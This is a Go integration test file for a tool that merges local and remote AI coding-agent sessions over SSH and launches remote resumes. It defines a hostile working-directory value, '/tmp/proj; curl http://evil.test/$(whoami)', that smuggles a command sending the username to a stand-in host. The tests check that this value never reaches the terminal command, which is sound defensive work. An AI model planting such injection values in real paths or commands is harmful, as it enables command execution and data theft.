package main

import (
	"encoding/json"
	"net/http"
	"net/http/httptest"
	"strings"
	"sync/atomic"
	"testing"
	"time"

	"github.com/centauri-ai/coslash/collector/internal/launch"
	"github.com/centauri-ai/coslash/collector/internal/remote"
	"github.com/centauri-ai/coslash/collector/internal/settings"
	"github.com/centauri-ai/coslash/collector/internal/synthesis"
	remoteviewv1 "github.com/centauri-ai/coslash/collector/remoteview/v1"
)

const integrationRemoteID = "r_0123456789abcdef"
const integrationSessionID = "9c73be46-52af-4b1d-9ee7-123456789abc"
const hostileRemoteCwd = `/tmp/proj; curl http://evil.test/$(whoami)`

func TestSessionsHealthyMergeIncludesRemote(t *testing.T) {
	t.Setenv("COSLASH_HOME", t.TempDir())
	t.Setenv("HOME", t.TempDir())
	mgr, _ := integrationRemoteManager(t, nil)
	handler := routes(synthesis.NewManager(nil), settings.Open(), mgr, nil)

	response := httptest.NewRecorder()
	handler.ServeHTTP(response, httptest.NewRequest(http.MethodGet, "/api/sessions", nil))
	if response.Code != http.StatusOK {
		t.Fatalf("status=%d body=%s", response.Code, response.Body.String())
	}
	var body sessionsResponse
	if err := json.Unmarshal(response.Body.Bytes(), &body); err != nil {
		t.Fatal(err)
	}
	if len(body.Machines) != 2 {
		t.Fatalf("machines=%d", len(body.Machines))
	}
	if body.Machines[0].SourceID != localSourceID || body.Machines[1].SourceID != integrationRemoteID {
		t.Fatalf("machines=%+v", body.Machines)
	}
	if body.Machines[1].State != remote.StateOK || body.Machines[1].Label != "gpu-server" {
		t.Fatalf("remote machine=%+v", body.Machines[1])
	}

	var remoteSession *boardSession
	for i := range body.Sessions {
		if body.Sessions[i].SourceID == integrationRemoteID {
			remoteSession = &body.Sessions[i]
			break
		}
	}
	if remoteSession == nil {
		t.Fatal("expected remote session in merge")
	}
	if remoteSession.SourceLabel != "gpu-server" || remoteSession.ID != integrationSessionID {
		t.Fatalf("remote session=%+v", remoteSession)
	}
	if !remoteSession.EligibleForAggregates || remoteSession.DisplayStale {
		t.Fatalf("healthy remote must be eligible: %+v", remoteSession)
	}
	if remoteSession.WorkingDirectory != hostileRemoteCwd {
		t.Fatalf("cwd=%q", remoteSession.WorkingDirectory)
	}
}

func TestSessionsSameIDKeepsSourceDistinctInEnvelope(t *testing.T) {
	t.Setenv("COSLASH_HOME", t.TempDir())
	t.Setenv("HOME", t.TempDir())
	mgr, _ := integrationRemoteManager(t, nil)
	handler := routes(synthesis.NewManager(nil), settings.Open(), mgr, nil)

	response := httptest.NewRecorder()
	handler.ServeHTTP(response, httptest.NewRequest(http.MethodGet, "/api/sessions", nil))
	var body sessionsResponse
	if err := json.Unmarshal(response.Body.Bytes(), &body); err != nil {
		t.Fatal(err)
	}

	keys := map[string]int{}
	for _, session := range body.Sessions {
		key := session.SourceID + ":" + session.Agent + ":" + session.ID
		keys[key]++
		if session.ID == integrationSessionID && session.SourceID == localSourceID {
			t.Fatal("remote session must not be labeled local")
		}
	}
	remoteKey := integrationRemoteID + ":codex:" + integrationSessionID
	if keys[remoteKey] != 1 {
		t.Fatalf("keys=%v", keys)
	}
}

func TestSessionsRemoteFailureKeepsLocalOKAndStaleRemote(t *testing.T) {
	t.Setenv("COSLASH_HOME", t.TempDir())
	t.Setenv("HOME", t.TempDir())
	var calls atomic.Int32
	fake := &remote.FakeRunner{Hook: func(call remote.FakeCall) (remote.RunResult, error) {
		n := calls.Add(1)
		now := time.Now()
		result := remote.RunResult{ExitCode: 0, StartedAt: now, FinishedAt: now}
		if call.RemoteCommand == remote.ProbeCommand() {
			result.Stdout = mustFrame(t, mustMarshalProbe(t))
			return result, nil
		}
		if n <= 2 {
			result.Stdout = mustFrame(t, mustMarshalViewWithCwd(t, 0, now.UnixMilli(), hostileRemoteCwd))
			return result, nil
		}
		result.ExitCode = 255
		result.Stderr = []byte("ssh: connect failed")
		return result, nil
	}}
	mgr := remote.NewManager(remote.Options{Runner: fake, Cache: remote.NewCache(t.TempDir())})
	cfg := &settings.RemoteSettings{ID: integrationRemoteID, SSHAlias: "gpu-server", Enabled: true}
	if err := mgr.ApplySettings(cfg); err != nil {
		t.Fatal(err)
	}
	waitRemoteOK(t, mgr)

	handler := routes(synthesis.NewManager(nil), settings.Open(), mgr, nil)
	before := httptest.NewRecorder()
	handler.ServeHTTP(before, httptest.NewRequest(http.MethodGet, "/api/sessions", nil))
	if before.Code != http.StatusOK {
		t.Fatalf("healthy status=%d", before.Code)
	}

	health := mgr.Retry()
	deadline := time.Now().Add(2 * time.Second)
	for time.Now().Before(deadline) {
		health = mgr.DiagnosticsHealth()
		if health.State == remote.StateStale && !health.Refreshing {
			break
		}
		time.Sleep(5 * time.Millisecond)
	}
	if health.State != remote.StateStale {
		t.Fatalf("expected stale, got %+v", health)
	}

	response := httptest.NewRecorder()
	handler.ServeHTTP(response, httptest.NewRequest(http.MethodGet, "/api/sessions", nil))
	if response.Code != http.StatusOK {
		t.Fatalf("stale merge must not fail local list: status=%d", response.Code)
	}
	var body sessionsResponse
	if err := json.Unmarshal(response.Body.Bytes(), &body); err != nil {
		t.Fatal(err)
	}
	if body.Machines[0].SourceID != localSourceID || body.Machines[0].State != remote.StateOK {
		t.Fatalf("local machine=%+v", body.Machines[0])
	}
	if len(body.Machines) < 2 || body.Machines[1].State != remote.StateStale {
		t.Fatalf("machines=%+v", body.Machines)
	}
	for _, session := range body.Sessions {
		if session.SourceID != integrationRemoteID {
			continue
		}
		if session.EligibleForAggregates || !session.DisplayStale {
			t.Fatalf("stale remote must be ineligible: %+v", session)
		}
	}
}

func TestRemoteSinceReachesSnapshotArgv(t *testing.T) {
	t.Setenv("COSLASH_HOME", t.TempDir())
	t.Setenv("HOME", t.TempDir())
	var lastSince atomic.Int64
	lastSince.Store(-1)
	var coverage atomic.Int64
	coverage.Store(8_000)
	fake := &remote.FakeRunner{Hook: func(call remote.FakeCall) (remote.RunResult, error) {
		now := time.Now()
		result := remote.RunResult{ExitCode: 0, StartedAt: now, FinishedAt: now}
		if call.RemoteCommand == remote.ProbeCommand() {
			result.Stdout = mustFrame(t, mustMarshalProbe(t))
			return result, nil
		}
		since, requestNow := parseSnapshotArgs(t, call.RemoteCommand)
		lastSince.Store(since)
		covered := coverage.Load()
		// Contract requires coverageSinceMs == requestedSinceMs on the wire; the Mac
		// still trusts coverage against its own lastRequestedMs for completeness.
		result.Stdout = mustFrame(t, mustMarshalViewCoverage(t, covered, requestNow, covered))
		return result, nil
	}}
	mgr := remote.NewManager(remote.Options{Runner: fake, Cache: remote.NewCache(t.TempDir())})
	cfg := &settings.RemoteSettings{ID: integrationRemoteID, SSHAlias: "gpu-server", Enabled: true}
	if err := mgr.ApplySettings(cfg); err != nil {
		t.Fatal(err)
	}
	waitRemoteOK(t, mgr)
	if lastSince.Load() != 0 {
		t.Fatalf("initial since=%d", lastSince.Load())
	}

	handler := routes(synthesis.NewManager(nil), settings.Open(), mgr, nil)
	coverage.Store(5_000)
	// Hub-style all-local history (since=0) must not widen remote collection.
	request := httptest.NewRequest(http.MethodGet, "/api/sessions?since=0&remoteSince=5000", nil)
	response := httptest.NewRecorder()
	handler.ServeHTTP(response, request)
	if response.Code != http.StatusOK {
		t.Fatalf("status=%d", response.Code)
	}

	deadline := time.Now().Add(2 * time.Second)
	for time.Now().Before(deadline) {
		if lastSince.Load() == 5000 {
			return
		}
		time.Sleep(5 * time.Millisecond)
	}
	t.Fatalf("remoteSince never reached snapshot argv; last=%d", lastSince.Load())
}

func TestRemoteResumeHappyPathUsesFixedSSHCommand(t *testing.T) {
	t.Setenv("COSLASH_HOME", t.TempDir())
	t.Setenv("HOME", t.TempDir())
	var opened atomic.Value
	restore := launch.SetRemoteTerminalOpenerForTest(func(terminal, alias, remoteCommand string) error {
		opened.Store(terminal + "|" + alias + "|" + remoteCommand)
		return nil
	})
	t.Cleanup(restore)

	mgr, store := integrationRemoteManager(t, nil)
	handler := routes(synthesis.NewManager(nil), store, mgr, nil)
	sessionID := remoteViewSessionID(t, mgr)

	request := httptest.NewRequest(
		http.MethodPost,
		"/api/launch?source="+integrationRemoteID+"&agent=codex&id="+sessionID+"&mode=resume",
		nil,
	)
	response := httptest.NewRecorder()
	handler.ServeHTTP(response, request)
	if response.Code != http.StatusNoContent {
		t.Fatalf("status=%d body=%s", response.Code, response.Body.String())
	}
	got, _ := opened.Load().(string)
	if !strings.Contains(got, "terminal|gpu-server|") {
		t.Fatalf("opened=%q", got)
	}
	if !strings.Contains(got, `exec "$HOME/.local/bin/coslash" launch --agent codex --session `+sessionID+` --mode resume`) {
		t.Fatalf("remote command missing fixed resume grammar: %q", got)
	}
	if strings.Contains(got, hostileRemoteCwd) || strings.Contains(got, "evil.test") {
		t.Fatalf("remote cwd leaked into terminal command: %q", got)
	}
}

func TestRemoteStartFreshStagesHandoffBeforeTerminal(t *testing.T) {
	t.Setenv("COSLASH_HOME", t.TempDir())
	t.Setenv("HOME", t.TempDir())
	var handoffPuts atomic.Int32
	var opened atomic.Int32
	restore := launch.SetRemoteTerminalOpenerForTest(func(_, _, _ string) error {
		opened.Add(1)
		return nil
	})
	t.Cleanup(restore)

	fake := &remote.FakeRunner{Hook: func(call remote.FakeCall) (remote.RunResult, error) {
		now := time.Now()
		result := remote.RunResult{ExitCode: 0, StartedAt: now, FinishedAt: now}
		if call.RemoteCommand == remote.ProbeCommand() {
			result.Stdout = mustFrame(t, mustMarshalProbe(t))
			return result, nil
		}
		if strings.Contains(call.RemoteCommand, "handoff put") {
			handoffPuts.Add(1)
			if len(call.Stdin) == 0 {
				t.Fatal("expected handoff stdin")
			}
			result.Stdout = mustFrame(t, []byte(`{"id":"h_4f16c2d8e25a4ce88ee8d1d02810d455"}`))
			return result, nil
		}
		result.Stdout = mustFrame(t, mustMarshalViewWithCwd(t, 0, now.UnixMilli(), hostileRemoteCwd))
		return result, nil
	}}
	mgr, store := integrationRemoteManager(t, fake)
	handler := routes(synthesis.NewManager(nil), store, mgr, nil)
	sessionID := remoteViewSessionID(t, mgr)

	request := httptest.NewRequest(
		http.MethodPost,
		"/api/launch?source="+integrationRemoteID+"&agent=codex&id="+sessionID+"&mode=new",
		strings.NewReader("bounded handoff text"),
	)
	response := httptest.NewRecorder()
	handler.ServeHTTP(response, request)
	if response.Code != http.StatusNoContent {
		t.Fatalf("status=%d body=%s", response.Code, response.Body.String())
	}
	if handoffPuts.Load() != 1 {
		t.Fatalf("handoff puts=%d", handoffPuts.Load())
	}
	if opened.Load() != 1 {
		t.Fatalf("terminal opens=%d", opened.Load())
	}
}

func TestRemoteStartFreshStagingFailureSkipsTerminal(t *testing.T) {
	t.Setenv("COSLASH_HOME", t.TempDir())
	t.Setenv("HOME", t.TempDir())
	var opened atomic.Int32
	restore := launch.SetRemoteTerminalOpenerForTest(func(_, _, _ string) error {
		opened.Add(1)
		return nil
	})
	t.Cleanup(restore)

	fake := &remote.FakeRunner{Hook: func(call remote.FakeCall) (remote.RunResult, error) {
		now := time.Now()
		result := remote.RunResult{ExitCode: 0, StartedAt: now, FinishedAt: now}
		if call.RemoteCommand == remote.ProbeCommand() {
			result.Stdout = mustFrame(t, mustMarshalProbe(t))
			return result, nil
		}
		if strings.Contains(call.RemoteCommand, "handoff put") {
			result.ExitCode = 1
			result.Stderr = []byte("stage failed")
			return result, nil
		}
		result.Stdout = mustFrame(t, mustMarshalViewWithCwd(t, 0, now.UnixMilli(), hostileRemoteCwd))
		return result, nil
	}}
	mgr, store := integrationRemoteManager(t, fake)
	handler := routes(synthesis.NewManager(nil), store, mgr, nil)
	sessionID := remoteViewSessionID(t, mgr)

	request := httptest.NewRequest(
		http.MethodPost,
		"/api/launch?source="+integrationRemoteID+"&agent=codex&id="+sessionID+"&mode=new",
		strings.NewReader("bounded handoff text"),
	)
	response := httptest.NewRecorder()
	handler.ServeHTTP(response, request)
	if response.Code != http.StatusBadGateway {
		t.Fatalf("status=%d body=%s", response.Code, response.Body.String())
	}
	if opened.Load() != 0 {
		t.Fatal("terminal must not open after staging failure")
	}
}

func TestAPIBroaderRemoteSinceMarksIncomplete(t *testing.T) {
	t.Setenv("COSLASH_HOME", t.TempDir())
	t.Setenv("HOME", t.TempDir())
	var coverage atomic.Int64
	coverage.Store(5_000)
	fake := &remote.FakeRunner{Hook: func(call remote.FakeCall) (remote.RunResult, error) {
		now := time.Now()
		result := remote.RunResult{ExitCode: 0, StartedAt: now, FinishedAt: now}
		if call.RemoteCommand == remote.ProbeCommand() {
			result.Stdout = mustFrame(t, mustMarshalProbe(t))
			return result, nil
		}
		_, requestNow := parseSnapshotArgs(t, call.RemoteCommand)
		covered := coverage.Load()
		result.Stdout = mustFrame(t, mustMarshalViewCoverage(t, covered, requestNow, covered))
		return result, nil
	}}
	mgr := remote.NewManager(remote.Options{Runner: fake, Cache: remote.NewCache(t.TempDir())})
	if err := mgr.ApplySettings(&settings.RemoteSettings{ID: integrationRemoteID, SSHAlias: "gpu-server", Enabled: true}); err != nil {
		t.Fatal(err)
	}
	waitRemoteOK(t, mgr)

	handler := routes(synthesis.NewManager(nil), settings.Open(), mgr, nil)
	coverage.Store(0)
	response := httptest.NewRecorder()
	handler.ServeHTTP(response, httptest.NewRequest(http.MethodGet, "/api/sessions?remoteSince=0", nil))
	if response.Code != http.StatusOK {
		t.Fatalf("status=%d", response.Code)
	}
	var body sessionsResponse
	if err := json.Unmarshal(response.Body.Bytes(), &body); err != nil {
		t.Fatal(err)
	}
	if len(body.Machines) < 2 {
		t.Fatalf("machines=%d", len(body.Machines))
	}
	remoteMachine := body.Machines[1]
	if remoteMachine.Complete {
		t.Fatalf("broader window must be incomplete while refreshing: %+v", remoteMachine)
	}
	for _, session := range body.Sessions {
		if session.SourceID == integrationRemoteID && session.EligibleForAggregates {
			t.Fatalf("incomplete remote cards must not affect aggregates: %+v", session)
		}
	}
}

func integrationRemoteManager(t *testing.T, fake *remote.FakeRunner) (*remote.Manager, *settings.Store) {
	t.Helper()
	if fake == nil {
		fake = &remote.FakeRunner{Hook: func(call remote.FakeCall) (remote.RunResult, error) {
			now := time.Now()
			result := remote.RunResult{ExitCode: 0, StartedAt: now, FinishedAt: now}
			if call.RemoteCommand == remote.ProbeCommand() {
				result.Stdout = mustFrame(t, mustMarshalProbe(t))
				return result, nil
			}
			result.Stdout = mustFrame(t, mustMarshalViewWithCwd(t, 0, now.UnixMilli(), hostileRemoteCwd))
			return result, nil
		}}
	}
	store := settings.Open()
	cfg := settings.Defaults()
	cfg.Remote = &settings.RemoteSettings{ID: integrationRemoteID, SSHAlias: "gpu-server", Enabled: true}
	if err := store.Save(cfg); err != nil {
		t.Fatal(err)
	}
	mgr := remote.NewManager(remote.Options{Runner: fake, Cache: remote.NewCache(t.TempDir())})
	if err := mgr.ApplySettings(cfg.Remote); err != nil {
		t.Fatal(err)
	}
	waitRemoteOK(t, mgr)
	return mgr, store
}

func mustMarshalViewWithCwd(t *testing.T, since, now int64, cwd string) []byte {
	t.Helper()
	return mustMarshalViewCoverage(t, since, now, since, cwd)
}

func mustMarshalViewCoverage(t *testing.T, since, now, coverage int64, cwd ...string) []byte {
	t.Helper()
	status := "active"
	view := remoteviewv1.View{
		SchemaVersion:    remoteviewv1.SchemaVersion,
		CollectorVersion: "dev",
		Capabilities:     []string{remoteviewv1.CapabilityRemoteView, remoteviewv1.CapabilityRemoteLaunch},
		LaunchableAgents: []string{remoteviewv1.AgentClaude, remoteviewv1.AgentCodex},
		RequestedSinceMs: since,
		RequestNowMs:     now,
		HostNowMs:        now,
		CollectedAtMs:    now,
		CoverageSinceMs:  coverage,
		Host:             remoteviewv1.Host{OS: "linux", Arch: "amd64"},
		Sessions: []remoteviewv1.Session{{
			Agent:              remoteviewv1.AgentCodex,
			SourceSessionID:    integrationSessionID,
			Status:             &status,
			SessionStartedAtMs: now - 1000,
			LastActivityAtMs:   now,
			Counts:             remoteviewv1.Counts{Turns: 1},
			Usage:              remoteviewv1.Usage{Models: []remoteviewv1.ModelUsage{}, UnpricedModels: []string{}},
			Digest:             []remoteviewv1.Digest{},
			Todos:              []remoteviewv1.Todo{},
			FileEdits:          []remoteviewv1.FileEdit{},
			Commits:            []string{},
			Subagents:          []remoteviewv1.Subagent{},
		}},
	}
	if len(cwd) > 0 && cwd[0] != "" {
		dir := cwd[0]
		view.Sessions[0].WorkingDirectory = &dir
	}
	payload, err := remoteviewv1.Marshal(view)
	if err != nil {
		t.Fatal(err)
	}
	return payload
}
